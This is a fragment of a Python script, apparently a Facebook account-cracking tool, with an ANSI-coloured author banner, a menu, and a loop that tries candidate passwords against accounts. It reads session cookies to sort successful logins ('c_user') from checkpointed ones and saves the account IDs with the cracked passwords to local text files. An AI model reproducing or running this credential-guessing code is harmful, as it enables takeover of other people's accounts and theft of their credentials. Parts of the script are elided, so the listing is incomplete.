...
\x1b[1;97m🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹
\033[1;31m         HACEKR RaYees Parwiz 💛👈 \33[0m
\x1b[1;97m🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹
\033[1;32m[+] 𝗔𝗨𝗧𝗛𝗢𝗥 | Parwiz
\033[1;33m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 | Parwiz Nikzaad
\033[1;34m[+] 𝗚𝗜𝗧𝗛𝗨𝗕  | Parwiz Nikzaad
...
time.sleep(3.1)
print("")
print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••RAYEES PARWIZ•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
time.sleep(3.0)
os.system("clear")
print(logo)
print(" [+]𝗠𝗘𝗡𝗨  𝗠𝗘𝗧𝗛𝗢𝗗")
...
def riaz():
	...
	if riaz1 =='4':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100076211978824&mibextid=ZbWKwL');riaz()
	if riaz1 =='2':
		bangla()
	else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR™Mahdi-OK] '+cid+'|'+ps+'\033[0;97m')
                open('MR™Parwiz-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[MR™Parwiz-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('MR™Parwiz-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR.MR™Parwiz\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
